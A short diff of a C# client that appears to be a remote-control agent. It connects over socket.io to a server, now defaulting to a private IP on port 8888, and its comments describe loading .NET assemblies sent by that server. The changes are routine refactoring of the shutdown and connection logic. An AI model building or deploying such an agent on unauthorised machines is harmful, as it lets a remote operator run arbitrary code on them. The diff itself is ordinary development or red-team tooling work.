@@ -26,8 +26,11 @@ namespace CoreClient
     }
     public class Program
     {
+        public static bool Running;
+
         public static void Main(string[] args)
         {
+            Running = true;
             if (args.Length > 0)
             {
                 Go(args[0]);
@@ -36,11 +39,12 @@ namespace CoreClient
             {
                 Go();
             }
-            while (true) {
+            while (Running)
+            {
                 Thread.Sleep(100);
             };
         }
-        static async void Go(string home = "http://localHost:8888")
+        static async Task<bool> Go(string home = "http://172.16.113.1:8888")
         {
             // create new socket.io client
             var client = new SocketIO(home);
@@ -65,7 +69,7 @@ namespace CoreClient
             // Shut down the agent
             client.On("exit", response =>
             {
-                Environment.Exit(0);
+                Running = false;
             });
 
             // Client load .NET assembly (dll)
@@ -177,6 +181,7 @@ namespace CoreClient
 
             // finally, connect to the server and start the party
             await client.ConnectAsync();
+            return true;
         }
         static void RunAndReturn(SocketIO client, SocketIOResponse response)
         {
